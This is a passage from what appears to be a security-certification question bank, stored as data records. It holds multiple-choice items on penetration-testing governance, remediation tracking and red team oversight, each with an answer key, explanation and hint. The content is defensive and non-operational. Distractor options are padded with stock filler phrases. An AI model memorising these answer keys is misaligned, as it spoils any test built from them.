    correct: 0, why: "Policy controls and MFA reduce the effect of weak passwords.",
    hint: "Controls over advice."
  },
  {
    id: 390, rank: 2, role: "pentest", topic: "Business Continuity Test", difficulty: "ADVANCED",
    q: "Why include recovery objectives in a security test report?",
    options: ["To avoid discussing impact","To replace the findings list","To make the report look more technical","To show whether recovery meets the business expectations"],
    correct: 3, why: "Impact is judged against recovery objectives.",
    hint: "RTO and RPO."
  },
  {
    id: 391, rank: 2, role: "pentest", topic: "Threat Actor Relevance", difficulty: "ADVANCED",
    q: "Why tailor a test scenario to the client's likely threat actors?",
    options: ["It lets the tester ignore the rules of engagement","It guarantees that every weakness will be found","It avoids the need for a scope document","It makes results relevant to the risks the client faces"],
    correct: 3, why: "Relevant scenarios help the client prioritise real risk.",
    hint: "Relevance."
  },
  {
    id: 392, rank: 2, role: "pentest", topic: "Detection Validation Report", difficulty: "ADVANCED",
    exhibit: "Action                    Logged  Alerted\nNew admin account         yes     yes\nScheduled task created    yes     no\nRemote service use        yes     no\nSecurity log cleared      yes     yes",
    q: "What does this exercise table tell the client?",
    options: ["The exercise was not carried out as planned","All simulated actions were detected, and contained quickly","None of the simulated actions generated any logs, as a general rule","Several simulated actions were logged but never alerted on"],
    correct: 3, why: "Logged but not alerted shows a tuning gap rather than a missing log source.",
    hint: "Logged versus alerted."
  },
  {
    id: 393, rank: 2, role: "pentest", topic: "Production Safety Rule", difficulty: "ADVANCED",
    q: "The client wants a test on production during business hours. What is the BEST safeguard?",
    options: ["Test everything at full speed to see what breaks, in most cases","Refuse all production testing under any circumstance, where that is practical","Agree non-disruptive methods and stop conditions in advance","Tell staff to stop using the system for the day, wherever possible"],
    correct: 2, why: "Refusing is the runner-up as it is safe, but real risk lives in production so controlled testing is more useful.",
    hint: "Controlled testing."
  },
  {
    id: 394, rank: 2, role: "pentest", topic: "Risk Acceptance Exhibit", difficulty: "ADVANCED",
    exhibit: "Finding: Unsupported database version (Critical)\nDecision: Accept\nApproved by: IT\nOwner: -\nExpiry: -\nCompensating controls: -",
    q: "What is the main problem with this risk acceptance record?",
    options: ["It records the compensating controls in place","It has no owner no expiry and no compensating controls","It names the business owner and an expiry date","It was approved by an accountable executive"],
    correct: 1, why: "Accepted risk must be owned and time limited.",
    hint: "Owner and expiry."
  },
  {
    id: 395, rank: 2, role: "pentest", topic: "Retest Evidence", difficulty: "ADVANCED",
    q: "Which evidence best confirms a finding is fixed?",
    options: ["A repeat of the original check showing the issue is gone","A ticket marked closed by the developer, as a general rule","A promise from the manager that it is done","The date when the patch was scheduled"],
    correct: 0, why: "Verification uses the same method as the original finding.",
    hint: "Repeat the check."
  },
  {
    id: 396, rank: 2, role: "pentest", topic: "Cloud Test Rules", difficulty: "ADVANCED",
    q: "What should be agreed before assessing a cloud-hosted system?",
    options: ["Which accounts services and test types are authorised","How many tools the tester will use","The colour scheme of the report","Which provider employees may be contacted informally"],
    correct: 0, why: "Cloud tests must respect both client scope and provider policy.",
    hint: "Scope and policy."
  },
  {
    id: 397, rank: 2, role: "pentest", topic: "Mapping Findings to Controls", difficulty: "ADVANCED",
    q: "Why map findings to a control framework?",
    options: ["It lets the client avoid fixing minor findings","It shows which control objectives are not being met","It removes the need to write finding descriptions","It hides the technical evidence from readers"],
    correct: 1, why: "Mapping connects technical issues to governance requirements.",
    hint: "Link to controls."
  },
  {
    id: 398, rank: 2, role: "pentest", topic: "Vulnerability Age Exhibit", difficulty: "ADVANCED",
    exhibit: "Severity  Open  Median age (days)  Policy (days)\nCritical  18    97                 15\nHigh      44    120                30\nMedium    130   210                90\nLow       260   300                180",
    q: "Which conclusion does this vulnerability ageing chart support?",
    options: ["Findings are all closed within the first week","The client has no findings at all","Critical findings are not being fixed within policy","Low findings are the only ones that remain open"],
    correct: 2, why: "Many old critical items show remediation is failing.",
    hint: "Age and severity."
  },
  {
    id: 399, rank: 2, role: "pentest", topic: "Shared Admin Accounts", difficulty: "ADVANCED",
    q: "Why are shared administrator accounts a finding?",
    options: ["They reduce the need for any logging","They always have the strongest encryption","They make passwords easier to remember for everyone","Actions cannot be linked to one person"],
    correct: 3, why: "Accountability requires unique identities.",
    hint: "Who did it?"
  },
  {
    id: 400, rank: 2, role: "pentest", topic: "Communication of Critical Findings", difficulty: "ADVANCED",
    q: "What should a tester do on finding an exposed critical weakness during testing?",
    options: ["Wait for the final report to avoid confusion, then record the result in the ticket","Exploit it further to prove the impact","Notify the client contact promptly and do not wait for the report","Post the details publicly to warn others"],
    correct: 2, why: "Immediate notice allows the client to reduce risk quickly.",
    hint: "Tell them now."
  },
  {
    id: 401, rank: 3, role: "pentest", topic: "Testing Programme Design", difficulty: "EXPERT",
    q: "A large company wants a testing programme for 300 applications. What is the BEST way to structure it?",
    options: ["Test every application at full depth every single month","Test a random application each quarter and ignore the rest","Test only the applications that developers choose to submit","Tier applications by risk and set testing depth and frequency per tier"],
    correct: 3, why: "Testing everything monthly is the runner-up as it is thorough, but it is unaffordable and does not match effort to risk.",
    hint: "Risk tiers."
  },
  {
    id: 402, rank: 3, role: "pentest", topic: "Threat-Led Test Planning", difficulty: "EXPERT",
    q: "How should an architect use threat intelligence when planning an assessment?",
    options: ["Choose scenarios that reflect the actors likely to target the sector","Pick scenarios by drawing names from a hat each time","Copy last year's plan without any review of the threats, then record the result in the ticket","Use only the techniques that the testers find easiest"],
    correct: 0, why: "Threat-led scenarios make the exercise relevant to real risk.",
    hint: "Relevant threats."
  },
  {
    id: 403, rank: 3, role: "pentest", topic: "Detection Coverage Exhibit", difficulty: "EXPERT",
    exhibit: "Tactic                 Tested  Detected\nInitial access         8       7\nExecution              10      8\nCredential access      9       2\nLateral movement       7       1\nExfiltration           5       3",
    q: "Which conclusion does this coverage map support?",
    options: ["Initial access activity has the strongest detection only","No techniques were tested during the exercise","Every technique is fully detected and responded to","Credential, and lateral movement activity has the weakest detection"],
    correct: 3, why: "Low coverage areas should drive detection engineering priorities.",
    hint: "Lowest coverage."
  },
  {
    id: 404, rank: 3, role: "pentest", topic: "Rules for Red Team Governance", difficulty: "EXPERT",
    q: "Which governance element is essential for a red team operation?",
    options: ["Informing every employee about it and nothing at all is a surprise to staff","A small trusted control group that can stop the operation","A public announcement of the dates, and targets","No oversight, and the team can work freely"],
    correct: 1, why: "A white cell keeps the exercise safe and controlled.",
    hint: "White cell."
  },
  {
    id: 405, rank: 3, role: "pentest", topic: "Metrics for Assurance", difficulty: "EXPERT",
    q: "Which metric best shows assurance programme health to a board?",
    options: ["Number of testers employed by the vendor","Total number of tests carried out last year, in most cases","Time to fix critical findings and trend of repeat issues","Average length of the reports delivered, as a general rule"],
    correct: 2, why: "Outcomes show risk reduction better than activity counts.",
    hint: "Outcomes."
  },
  {
    id: 406, rank: 3, role: "pentest", topic: "Vendor Selection for Testing", difficulty: "EXPERT",
    q: "Which criterion should carry the most weight when selecting a testing provider?",
    options: ["Relevant experience, method quality and handling of client data","The longest list of tools in their brochure","The most colourful sample report in the proposal","The lowest day rate offered with no other conditions"],
    correct: 0, why: "Quality and trust matter more than price alone.",
    hint: "Quality and trust."
  },
  {
    id: 407, rank: 3, role: "pentest", topic: "Test Data Safety Exhibit", difficulty: "EXPERT",
    exhibit: "Test plan v2\nEnvironment: PRODUCTION (customer-db-prod)\nData: live customer records\nBackup before test: not required\nRollback plan: none\nWindow: business hours, no notification to operations",
    q: "What is the main issue in this test plan?",
    options: ["Testing with an agreed window and contacts, and revisit the decision after the next release","Testing with a written stop condition, then record the result in the ticket","Testing against a clone with masked data, then record the result in the ticket","Testing against production with real customer data and no rollback"],
    correct: 3, why: "Production data and no rollback raise operational and privacy risk.",
    hint: "Production, real data."
  },
  {
    id: 408, rank: 3, role: "pentest", topic: "Remediation Governance", difficulty: "EXPERT",
    q: "What helps ensure findings are fixed within agreed timescales?",
    options: ["Named owners and due dates by severity with escalation, in most cases","A report sent once with no follow-up","Delaying all fixes until the next audit","A general request to fix things when the teams have the time to look at it"],
    correct: 0, why: "Accountability and escalation drive closure.",
    hint: "Owners and dates."
  },
  {
    id: 409, rank: 3, role: "pentest", topic: "Residual Risk Reporting", difficulty: "EXPERT",
    q: "How should residual risk after remediation be reported?",
    options: ["As the risk the previous team had","What remains and why it was accepted, and by whom","A statement that all risk has been removed, and that no further work is needed","No mention of the unresolved items and the report stays short, and positive"],
    correct: 1, why: "Residual risk must be visible and owned.",
    hint: "Visible and owned."
  },
  {
    id: 410, rank: 3, role: "pentest", topic: "Attack Path Review Exhibit", difficulty: "EXPERT",
    exhibit: "Path: phishing foothold (user PC) -> shared workstation (local admin: IT-Support group)\n-> cached domain admin token -> domain controller\nControls observed: no tiered admin, no credential guard, no restricted logon",
    q: "Which control would best break the path described in this diagram summary?",
    options: ["Removing the standing admin rights from the shared workstation","Adding a new colour to the intranet theme","Increasing the size of the log disk","Publishing the diagram to all staff, and review the outcome at the next monthly meeting"],
    correct: 0, why: "Cutting the privileged link removes the route to the domain controller.",
    hint: "Break the chain."
  },
  {
    id: 411, rank: 3, role: "pentest", topic: "Tiered Administration", difficulty: "EXPERT",
    q: "Why use tiered administration in a directory environment?",
    options: ["It keeps privileged credentials off lower-trust systems","It gives all staff domain admin rights","It removes the need for monitoring","It makes passwords shorter for administrators, and they are easier to type quickly"],
    correct: 0, why: "Tiering limits credential theft impact.",
    hint: "Separate tiers."
  },
  {
    id: 412, rank: 3, role: "pentest", topic: "Assume Breach Planning", difficulty: "EXPERT",
    q: "Which statement BEST describes an assume-breach testing model?",
    options: ["It assumes the defenders are always successful","It starts with a foothold to test detection and response","It tests only the outer perimeter, and stops once that boundary has been checked","It starts by publishing the results first"],
    correct: 1, why: "The perimeter-only model is the runner-up as it is traditional, but it does not test what happens after an intruder gets in.",
    hint: "Start inside."
  },
  {
    id: 413, rank: 3, role: "pentest", topic: "Reporting to Regulators", difficulty: "EXPERT",
    q: "A regulator asks for evidence of independent testing. What is the best approach?",
    options: ["Send only the invoice","Refuse to provide any information, and revisit the decision after the next release","Provide an attestation, and summary while protecting technical detail","Send the full technical report with every exploit detail, in most cases"],
    correct: 2, why: "Summaries meet the need without exposing sensitive detail.",
    hint: "Attestation."
  },
  {
    id: 414, rank: 3, role: "pentest", topic: "Capacity Planning for Fixes", difficulty: "EXPERT",
    q: "Why involve engineering leaders when planning remediation after a major test?",
    options: ["They can schedule fixes against capacity and dependencies","They can remove findings that they dislike before the report goes to the auditors","They can approve a much shorter version of the report for the whole board to read","They can choose the font, and the cover page for the report that gets delivered"],
    correct: 0, why: "Fixes compete with other work and need planning.",
    hint: "Plan the work."
  },
  {
    id: 415, rank: 3, role: "pentest", topic: "Test Result Sharing", difficulty: "EXPERT",
    q: "How widely should detailed findings be shared inside the client?",
    options: ["Only with owners who need them and leaders in summary","On a public site for transparency","With nobody apart from the testers","With every employee through the staff newsletter that goes out each Friday morning"],
    correct: 0, why: "Need-to-know limits exposure of weaknesses.",
    hint: "Need to know."
  },
  {
    id: 416, rank: 3, role: "pentest", topic: "Control Validation Exhibit", difficulty: "EXPERT",
    exhibit: "Simulation set: 20 behaviours\nBlocked: 10   Alerted only: 6   No telemetry: 4\nPolicy: standard profile v3.2, tamper protection ON\nHosts: 25 corporate laptops",
    q: "What does this control test result show?",
    options: ["The control blocked only half of the simulated behaviours","The control blocked every behaviour that the testers ran against the laptops all week","The control was never installed on any of the twenty-five laptops in the test group","The control was disabled by policy on the laptops and, and nothing was ever recorded"],
    correct: 0, why: "Partial blocking shows tuning gaps.",
    hint: "Blocked count."
  },
  {
    id: 417, rank: 3, role: "pentest", topic: "Security Champions Link", difficulty: "EXPERT",
    q: "How can a test programme support security champions in development teams?",
    options: ["Name and shame teams with the most findings","Send them the report, and nothing else","Prevent them from seeing any results","Share patterns, and run workshops on the most common issues, in the first instance"],
    correct: 3, why: "Education closes the feedback loop.",
    hint: "Teach patterns."
  },
  {
    id: 418, rank: 3, role: "pentest", topic: "Scope Creep Handling", difficulty: "EXPERT",
    q: "The client asks to add three systems mid-test. What is the best response?",
    options: ["Agree a written scope change covering time, cost and authorisation","Add them informally and hope the client pays later, as soon as practical","Refuse any change under all circumstances","Test them quietly without telling anyone"],
    correct: 0, why: "Changes need documented authorisation.",
    hint: "Written change."
  },
  {
    id: 419, rank: 3, role: "pentest", topic: "Supply Chain Assessment", difficulty: "EXPERT",
    q: "Why include third-party connections in an assessment scope where permitted?",
    options: ["They are irrelevant to risk","Trusted links can give attackers a path inward","They are tested by the provider only, and the client does not need to look at them","They are always out of scope in every case as the contract never covers them"],
    correct: 1, why: "Trusted connections are a real attack route.",
    hint: "Trust paths."
  },
  {
    id: 420, rank: 3, role: "pentest", topic: "Telemetry Quality", difficulty: "EXPERT",
    q: "Which logging gap most limits an investigation after an incident?",
    options: ["Too many analysts on the team who all want to review the same alerts at once","Too much storage space being available for the logs that the systems generate daily","Too many colourful dashboards that distract the analysts during their normal shifts","Missing process and login events on key systems"],
    correct: 3, why: "Without key telemetry the sequence of events cannot be rebuilt.",
    hint: "Key events."
  },
  {
    id: 421, rank: 3, role: "pentest", topic: "Containment Playbook Exhibit", difficulty: "EXPERT",
    exhibit: "Playbook: Suspected malware on endpoint\n1. Confirm alert\n2. Disconnect host from the network\n3. Re-image the host\n4. Close the ticket\nOwners: SOC L2. Escalation: none defined",
    q: "What is the main weakness in this containment playbook?",
    options: ["It lists the contact details of the incident team members for every shift of the week","No step to preserve evidence before isolating hosts","It names decision makers for isolation, and defines how serious each incident level is","It defines severity levels"],
    correct: 1, why: "Evidence preservation should be built into containment.",
    hint: "Evidence step."
  },
  {
    id: 422, rank: 3, role: "pentest", topic: "Metrics Misuse", difficulty: "EXPERT",
    q: "Why can counting the number of findings alone mislead leaders?",
    options: ["Because testers always find the same number of issues in every client they visit","Because findings never matter to leaders who only care about the cost of each test","It ignores severity, context and whether issues were fixed","Because the reports that the testers write are always too short to be understood"],
    correct: 2, why: "Counts without context hide risk.",
    hint: "Severity and context."
  },
  {
    id: 423, rank: 3, role: "pentest", topic: "Authorisation for Social Tests", difficulty: "EXPERT",
    q: "What additional safeguard is needed before testing staff with simulated lures?",
    options: ["Legal and HR approval, and rules for handling individual results, in most cases","Tell staff nothing and punish anyone who fails","Use pictures of colleagues' families","Use their private email addresses"],
    correct: 0, why: "HR and legal approval protects staff and the organisation.",
    hint: "HR and legal."
  },
  {
    id: 424, rank: 3, role: "pentest", topic: "Program Maturity Model", difficulty: "EXPERT",
    q: "What does a more mature assurance programme usually do differently?",
    options: ["Runs a single test once a year only, and it can satisfy the compliance auditors","Tests continuously against threats and tracks fixes","Tests only what is easy","Avoids sharing findings with the system owners who would have to fix the problems"],
    correct: 1, why: "Maturity means continuous, threat-informed and outcome-driven work.",
    hint: "Continuous."
  },
  {
    id: 425, rank: 3, role: "pentest", topic: "Zero Trust Test Findings", difficulty: "EXPERT",
    q: "A test shows that internal users could reach every server. Which recommendation fits zero trust?",
    options: ["Remove access logging, and review the outcome at the next monthly meeting","Trust all users on the corporate network, until the next scheduled review takes place","Share admin passwords","Enforce identity and device-based access to each application"],
    correct: 3, why: "Access should be decided per request.",
    hint: "Per-request."
  },
  {
    id: 426, rank: 3, role: "pentest", topic: "Evidence for Insurers", difficulty: "EXPERT",
    q: "Which evidence best supports a cyber insurance application about security testing?",
    options: ["A photograph of the server room that shows the new racks, and the cooling equipment","A verbal promise from the manager that the testing was done at some earlier point","Dated testing summaries and closure of critical findings","A list of the security tools that the company has purchased over the last few years"],
    correct: 2, why: "Insurers value dated evidence and remediation.",
    hint: "Dated evidence."
  },
  {
    id: 427, rank: 3, role: "pentest", topic: "Segmentation Verification", difficulty: "EXPERT",
    q: "How can a client BEST verify that segmentation rules work as intended?",
    options: ["Review the diagram once, and assume the rules are right","Trust the vendor documentation","Count the number of firewall rules","Test allowed and blocked paths between zones regularly"],
    correct: 3, why: "Reviewing a diagram is the runner-up as it is quick, but it does not show the real behaviour of the rules.",
    hint: "Test the paths."
  },
  {
    id: 428, rank: 3, role: "pentest", topic: "Resilience Exercise Exhibit", difficulty: "EXPERT",
    exhibit: "Tabletop: ransomware on file servers\nObservations:\n- Incident commander not named\n- Authority to isolate payment systems unclear (3 people assumed another would decide)\n- Contact list out of date for 5 of 12 roles\n- Backup restore time unknown",
    q: "Which finding from this tabletop exercise needs urgent attention?",
    options: ["Everyone knew the escalation contacts, and the plan had been tested the month before","Nobody knows who may approve isolating a key system","The legal team joined the exercise on time, and kept a record of the decisions made","The plan was tested last month, and the contact list was reviewed by all the owners"],
    correct: 1, why: "Unclear decision authority delays containment.",
    hint: "Who decides?"
  },
  {
    id: 429, rank: 3, role: "pentest", topic: "Cloud Test Programme", difficulty: "EXPERT",
    q: "How should a testing programme change when most workloads move to the cloud?",
    options: ["Test only the physical data centre, then record the result in the ticket","Add configuration and identity reviews and respect provider rules","Stop all testing as the provider is responsible","Ignore identities and permissions, and revisit the decision after the next release"],
    correct: 1, why: "Cloud risk centres on configuration and identity.",
    hint: "Config and identity."
  },
  {
    id: 430, rank: 3, role: "pentest", topic: "Finding Deduplication", difficulty: "EXPERT",
    q: "Why deduplicate findings across several tools before reporting?",
    options: ["To avoid having to validate any of the results that the different tools produce at all","To hide the critical issues among all of the minor ones that tools tend to report","To make the total number of findings look larger when the board reviews the report","To give owners one item to fix instead of many copies"],
    correct: 3, why: "Duplicates waste time and distort metrics.",
    hint: "One issue, one item."
  },
  {
    id: 431, rank: 3, role: "pentest", topic: "Risk Appetite Alignment", difficulty: "EXPERT",
    q: "How should testing results be aligned with risk appetite?",
    options: ["Ignore appetite, and treat all findings equally, and review the outcome at the next monthly meeting","Let testers set the appetite","Hide findings above appetite","Compare finding severity with agreed thresholds and escalate breaches"],
    correct: 3, why: "Thresholds determine escalation.",
    hint: "Thresholds."
  },
  {
    id: 432, rank: 3, role: "pentest", topic: "Quality Assurance of Testers", difficulty: "EXPERT",
    q: "How can a firm best maintain consistent test quality across teams?",
    options: ["Let each tester do whatever they prefer","Copy old reports, and revisit the decision after the next release","Avoid reviews to save time","Use shared methodology, peer review and training"],
    correct: 3, why: "Methods and review support consistency.",
    hint: "Method and review."
  },
  {
    id: 433, rank: 3, role: "pentest", topic: "Legacy Systems Findings", difficulty: "EXPERT",
    q: "A critical system cannot be patched because it is end-of-life. What is the best recommendation?",
    options: ["Publish it to the internet for support, then record the result in the ticket","Isolate it with compensating controls and plan its replacement","Disable all monitoring on it, and review the outcome at the next monthly meeting","Ignore it until it fails"],
    correct: 1, why: "Compensating controls reduce risk while replacement is planned.",
    hint: "Isolate and plan."
  },
  {
    id: 434, rank: 3, role: "pentest", topic: "Privacy Impact in Testing", difficulty: "EXPERT",
    q: "Why involve the privacy officer in planning large tests?",
    options: ["To handle personal data seen during testing lawfully","To approve the holiday requests of the testers while they are working at the client","To shorten the test, and the testers can finish the work well before the deadline","To avoid having to write a report as the privacy rules cover all of the work"],
    correct: 0, why: "Testing can expose personal data and needs legal handling.",
    hint: "Personal data."
  },
  {
    id: 435, rank: 3, role: "pentest", topic: "Closing the Loop", difficulty: "EXPERT",
    q: "What is the best indicator that a testing programme feeds engineering improvement?",
    options: ["The report was filed in a folder","The report had a nice cover","Pipeline checks and standards updated after each test","The test took less time than planned"],
    correct: 2, why: "Improvements show that lessons were acted on.",
    hint: "Lessons applied."
  },
  {
    id: 436, rank: 3, role: "pentest", topic: "Incident vs Test Distinction", difficulty: "EXPERT",
    q: "How can responders tell a planned test from a real attack when deconfliction fails?",
    options: ["Assume it is only a test","Turn off monitoring, and review the outcome at the next monthly meeting","Ignore the alert, and review the outcome at the next monthly meeting","Follow the incident process, and verify with the engagement contact"],
    correct: 3, why: "Treat as real until verified.",
    hint: "Treat as real."
  },
  {
    id: 437, rank: 3, role: "pentest", topic: "Reporting Cadence", difficulty: "EXPERT",
    q: "How often should leaders receive a testing and remediation update?",
    options: ["Once every five years when the audit committee next reviews the security programme","Never unless a senior leader happens to ask for it during one of the meetings","Regularly with trends and escalation of overdue items","Only after an incident has already happened, and caused damage to the organisation"],
    correct: 2, why: "Regular updates keep risk visible.",
    hint: "Regular."
  },
  {
    id: 438, rank: 3, role: "pentest", topic: "Pivot Exposure Exhibit", difficulty: "EXPERT",
    exhibit: "svc-backup, svc-report, svc-web share one password (age 1,430 days)\nMember of: Domain Admins\nInteractive logon: allowed on all servers\nPassword never expires: true",
    q: "Which recommendation best addresses this finding about service accounts?",
    options: ["Disable the audit log for those accounts, and revisit the decision after the next release","Keep the shared password and rotate it annually, then record the result in the ticket","Use managed accounts with unique secrets and restricted logon rights","Give the accounts domain admin for simplicity"],
    correct: 2, why: "Unique, restricted accounts limit lateral movement.",
    hint: "Unique and restricted."
  },
  {
    id: 439, rank: 3, role: "pentest", topic: "Escalation Criteria", difficulty: "EXPERT",
    q: "Which criterion best triggers escalation of a finding during a test?",
    options: ["Evidence of active compromise or serious harm","A finding that has a very long title, and that nobody on the team has seen before","A finding that was reported by a tool that the testers were not familiar with yet","A finding that was discovered on a Friday afternoon just before the weekend began"],
    correct: 0, why: "Critical exposure or active compromise warrants immediate escalation.",
    hint: "Immediate harm."
  },
  {
    id: 440, rank: 3, role: "pentest", topic: "Testing Independence", difficulty: "EXPERT",
    q: "Why should some testing be independent of the team that built the system?",
    options: ["To increase the number of meetings that the builders, and the testers have to attend weekly","To reduce bias and bring a fresh view, in most cases","To make the test cheaper for the client, and more teams can afford to use it each year","To avoid having to produce any report as independent testers only talk to managers"],
    correct: 1, why: "Independence reduces blind spots.",
    hint: "Fresh view."
  },
  {
    id: 441, rank: 3, role: "pentest", topic: "Assurance Portfolio", difficulty: "EXPERT",
    q: "What is the benefit of combining different assurance activities?",
    options: ["Each one covers weaknesses that the others miss","One activity always makes the others unnecessary","It removes the need for internal controls","It lets the organisation avoid reporting to the board"],
    correct: 0, why: "Different methods give different views of control strength.",
    hint: "Complementary views."
  },
  {
    id: 442, rank: 3, role: "pentest", topic: "Programme Budgeting", difficulty: "EXPERT",
    q: "A leader must cut testing spend by 30 percent. What is the BEST approach?",
    options: ["Stop testing the newest systems completely, and review the outcome at the next monthly meeting","Focus depth on the highest risk assets and reduce low value testing, in most cases","Cancel the retests that verify fixes","Cut equally across all applications, and tests"],
    correct: 1, why: "Cutting equally is the runner-up as it is simple, but it spends effort where risk is lowest.",
    hint: "Risk-based cuts."
  },
  {
    id: 443, rank: 3, role: "pentest", topic: "Findings Trend Exhibit", difficulty: "EXPERT",
    exhibit: "Quarter  New findings  Repeat class (access control)\nQ1       61            18\nQ2       58            22\nQ3       64            27\nQ4       60            31",
    q: "Which conclusion does this trend support?",
    options: ["The software is improving, and has no more issues","All teams have fully fixed their older findings","Testing has stopped finding anything useful","The same classes of issue keep reappearing in new releases, in most cases"],
    correct: 3, why: "Repeated issue types point to missing secure development controls.",
    hint: "Look at repeats."
  },
  {
    id: 444, rank: 3, role: "pentest", topic: "Secure SDLC Feedback", difficulty: "EXPERT",
    q: "How can test results improve a secure development lifecycle?",
    options: ["By delaying all releases until no findings remain, as a general rule","By blaming teams with the most findings","By adding standards training and automated checks for repeat issues","By hiding results from the developers"],
    correct: 2, why: "Fixing the process prevents repeat weaknesses.",
    hint: "Fix the process."
  },
  {
    id: 445, rank: 3, role: "pentest", topic: "Test Provider Rotation", difficulty: "EXPERT",
    q: "Why might an organisation rotate its testing providers?",
    options: ["To avoid ever repeating a test, as a general rule","To make the tests unauthorised","To gain fresh perspectives and methods","To reduce the quality of reports, as a general rule"],
    correct: 2, why: "Different teams may find different issues.",
    hint: "Fresh eyes."
  },
  {
    id: 446, rank: 3, role: "pentest", topic: "Control Objective Testing", difficulty: "EXPERT",
    q: "What is the difference between testing a control's design and its operation?",
    options: ["Operation is only checked by customers","They mean exactly the same thing","Design asks if it would work and operation asks if it did","Design is for hardware, and operation for software"],
    correct: 2, why: "Both are needed for assurance.",
    hint: "Would it vs did it."
  },
  {
    id: 447, rank: 3, role: "pentest", topic: "Board Briefing Exhibit", difficulty: "EXPERT",
    exhibit: "KPI                        Target  Actual\nCritical fixes in 15 days  95%     58%\nHigh fixes in 30 days      90%     71%\nTests completed            24      26\nTraining completion        98%     97%",
    q: "Which message from this dashboard should the board hear first?",
    options: ["The budget is unrelated to security risk","Critical fixes are late, and the exposure is growing","The number of tests is the best measure of safety","All objectives are green and need no attention"],
    correct: 1, why: "Leaders need the most important risk signals first.",
    hint: "Highlight the red."
  },
  {
    id: 448, rank: 3, role: "pentest", topic: "Pre-Production Gate", difficulty: "EXPERT",
    q: "What is the best purpose of a security gate before go-live?",
    options: ["To delay every release by at least a month","To confirm required testing is done and risks are accepted","To allow any release with a verbal approval","To check only the colour of the user interface"],
    correct: 1, why: "A gate gives a clear decision point with evidence.",
    hint: "Decision point."
  },
  {
    id: 449, rank: 3, role: "pentest", topic: "Legacy Application Testing", difficulty: "EXPERT",
    q: "How should assurance be adapted for a legacy application that cannot be modified?",
    options: ["Give it the highest risk rating without evidence","Ignore it as it cannot be fixed","Test the surrounding controls and protect it with compensating measures, as a first step","Remove it from the inventory"],
    correct: 2, why: "Compensating controls and monitoring reduce exposure.",
    hint: "Wrap it."
  },
  {
    id: 450, rank: 3, role: "pentest", topic: "Third-Party Report Reliance", difficulty: "EXPERT",
    q: "What should be checked before relying on a supplier's penetration test report?",
    options: ["Whether it is longer than ten pages","The number of colours used in the charts","Its scope date method, and the independence of the tester, as a general rule","Only whether the report has the supplier's logo"],
    correct: 2, why: "Reliance depends on scope and quality.",
    hint: "Scope and date."
  },
  {
    id: 451, rank: 4, role: "pentest", topic: "Assurance Strategy", difficulty: "EXPERT",
    q: "A board asks how to get independent assurance across the whole security programme. What is the BEST approach?",
    options: ["A self-assessment filled in by the teams that run the controls","A purchase of the most expensive scanning platform available, as a general rule","A layered plan that mixes testing, control audits and exercises","A single annual penetration test of the public website only, in most cases"],
    correct: 2, why: "A single annual test is the runner-up as it is independent, but it covers a narrow slice of the programme and a single point in time.",
    hint: "Layered."
  },
  {
    id: 452, rank: 4, role: "pentest", topic: "Adversary Emulation Governance", difficulty: "EXPERT",
    q: "What should a mature governance model require before an adversary emulation starts?",
    options: ["Permission from the testers themselves, and from no other person in the company","A promise that no system will be touched under any circumstance","A plan to keep the whole security team unaware for the full year","Approved objectives, risk limits and a stop authority"],
    correct: 3, why: "Clear authorisation and control limits keep the exercise safe and lawful.",
    hint: "Authority and limits."
  },
  {
    id: 453, rank: 4, role: "pentest", topic: "Emulation Results Exhibit", difficulty: "EXPERT",
    exhibit: "Objective: reach finance file server\nDetected: yes (after 6 h; target 2 h)\nContained: after 31 h (target 8 h)\nObjective achieved by red team: yes at hour 19\nLogs available: complete; playbook followed: partly",
    q: "What is the most important conclusion from this exercise summary?",
    options: ["No activity was observed by the monitoring team at any point","Detection, and containment both exceeded every target that was set before the work","Detection improved but containment still misses its target","The exercise was cancelled before any objective was attempted"],
    correct: 2, why: "Containment time remains above the target and needs process work.",
    hint: "Compare to target."
  },
  {
    id: 454, rank: 4, role: "pentest", topic: "Risk Quantification", difficulty: "EXPERT",
    q: "Which approach best makes testing results useful for financial decisions?",
    options: ["Estimate loss ranges for the scenarios the findings enable","List the raw technical findings without any further business context at all","Report only the number of hosts that were scanned in total","Give each finding a colour, and discuss it at the meeting"],
    correct: 0, why: "Loss scenarios let leaders compare risk and investment.",
    hint: "Express as loss."
  },
  {
    id: 455, rank: 4, role: "pentest", topic: "Programme Independence", difficulty: "EXPERT",
    q: "How can a security testing function preserve independence inside the organisation?",
    options: ["Let each system owner approve the final wording of the findings before release","Report to a leader outside the tested teams, where that is practical","Share all of the reports with the vendors being assessed first","Report to the head of the team whose systems are the subject of the testing"],
    correct: 1, why: "Independent reporting lines prevent pressure on results.",
    hint: "Reporting line."
  },
  {
    id: 456, rank: 4, role: "pentest", topic: "Continuous Control Validation", difficulty: "EXPERT",
    q: "Why validate security controls continuously rather than only once a year?",
    options: ["Controls never change, and annual checks are enough for every kind of environment","Continuous checks guarantee that no attacker can succeed","Continuous checks remove the need for any monitoring staff","Controls drift as things change and gaps open silently"],
    correct: 3, why: "Change and drift create gaps between assessments.",
    hint: "Drift."
  },
  {
    id: 457, rank: 4, role: "pentest", topic: "Detection Engineering Pipeline", difficulty: "EXPERT",
    q: "What is the best way to turn exercise findings into lasting detection improvements?",
    options: ["Wait for the next real incident to learn which rules matter, and revisit the decision after the next release","Brief the analysts once, and trust them to remember it","Print the report, and place it in the SOC meeting room","Write and test detections then track them in a detection backlog, wherever possible"],
    correct: 3, why: "Tracked, tested detections persist beyond the exercise.",
    hint: "Backlog."
  },
  {
    id: 458, rank: 4, role: "pentest", topic: "Boundary Review Exhibit", difficulty: "EXPERT",
    exhibit: "Corporate LAN 10.10.0.0/16  Payment LAN 10.10.0.0/16 (same routing domain)\nFirewall between zones: none\nJump host for payment admin: none\nFlow logging: disabled",
    q: "Which design weakness is shown by this network summary?",
    options: ["A flat network where two zones share routing","Separate zones with a firewall, and logging between them that the team reviews","A restricted management network that requires MFA for every administrator login","An isolated backup network with immutable storage"],
    correct: 0, why: "Shared routing between sensitive and general zones removes segmentation.",
    hint: "Flat network."
  },
  {
    id: 459, rank: 4, role: "pentest", topic: "Responsible Use of Findings", difficulty: "EXPERT",
    q: "An executive wants to use test findings to blame a team publicly. What is the best response?",
    options: ["Frame findings around systems and processes and avoid blaming people","Remove the findings, and nobody is embarrassed","Support the blame, and the team improves faster","Publish the names of the engineers who wrote the code, where that is practical"],
    correct: 0, why: "A blame-free approach keeps teams cooperative.",
    hint: "No blame."
  },
  {
    id: 460, rank: 4, role: "pentest", topic: "Test Programme Funding", difficulty: "EXPERT",
    q: "The CFO wants to cut the testing budget by half. What is the BEST argument?",
